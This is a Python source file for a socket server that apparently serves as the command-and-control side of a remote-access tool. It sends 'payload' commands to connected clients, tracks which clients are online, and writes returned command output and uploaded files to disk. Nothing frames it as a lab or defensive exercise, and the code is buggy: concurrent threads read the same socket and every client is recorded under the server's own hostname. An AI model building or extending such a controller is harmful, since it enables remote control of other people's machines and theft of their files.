
import ast
import socket
import sys
import os
from base64 import b64decode
import base64
import threading
import time


HOST_ADDR     = "127.0.0.1"
PORT        = 5000

clients_status = {}
#{ address: ON/OFF}
clients_conns  = {}
msg_id         = 0




server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST_ADDR, PORT))
server.listen()


def get_alive_signal(connection, address):
    with connection as client:
        while(True):
            try:
                msg = client.recv(3)
                # msg    = msg.decode('utf-8') 
            except socket.error:
                client_disconnect(connection,address)
                break
            except ValueError:
                break



def get_responses(connection,addr):
    with connection as client:
        while(True):
            try:
                msg = client.recv(30)
                
                base64_dec_msg = base64.decodebytes(msg)
                msg= base64_dec_msg.decode()
                lst = ["Received", "Initialized", "Running", "Finished", "Error"]
                if any(msg.startswith(item) for item in lst):
                    filepath = os.path.join(os.getcwd(), "responses.txt")
                    with open(filepath, "a") as f:
                        f.write(msg + "\n")
                    f.close()
            except base64.binascii.Error:
                pass
            except socket.error:
                client_disconnect(connection,addr)
                break

                
    
def get_post_exe_data(connection,addr):
    with connection as client:
        while(True):
            try:
                msg = client.recv(100000)
                msg = msg.decode('utf-8')
                if msg.startswith("{'output'"):
                    msg = ast.literal_eval(msg)
                    out = msg['output']
                    err = msg['err']
                    id  = msg['id']
                    if('filename' in msg.keys() and err == ""):
                        filepath = os.path.join(os.getcwd(), f"{msg['filename']}")
                        with open(filepath, "w") as f:
                            f.writelines(out)
                        f.close()
                    else:
                        filepath = os.path.join(os.getcwd(), f"{addr[0]}.txt")
                        with open(filepath, "a") as f:
                            f.writelines(f"command number: {id}\n")
                            if out != "":
                                f.writelines(out + "\n\n\n\n\n")
                            if err != "":
                                f.writelines(err+ "\n\n\n\n\n")
                        f.close()
            except socket.error:
                client_disconnect(connection,addr)
                break




def send_msg(conn,cmd):
    global msg_id
    msg_id+=1
    msg = {'payload':cmd.payload, 'type':cmd.type, 'args':cmd.args, 'id':msg_id}
    msg = str(msg).encode('utf-8')
    try:
        conn.send(msg)
    except socket.error:
        client_disconnect(conn)
        conn.close()
    return




def client_disconnect(connection,address=None):
    clients_status[address] = "OFF"
    if connection == None: 
        connection = clients_conns[address]
    connection.close()
    return



def clients_handler():
        while(True):
            conn, addr  =   server.accept()
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            addr = (hostname, ip_address)
            clients_conns[addr]  = conn
            clients_status[addr] = "ON"
            thread   = threading.Thread(target=get_alive_signal, args=(conn,addr))
            thread.start()
            thread   = threading.Thread(target=get_responses, args=(conn,addr))
            thread.start()
            thread   = threading.Thread(target=get_post_exe_data, args=(conn,addr))
            thread.start()

            

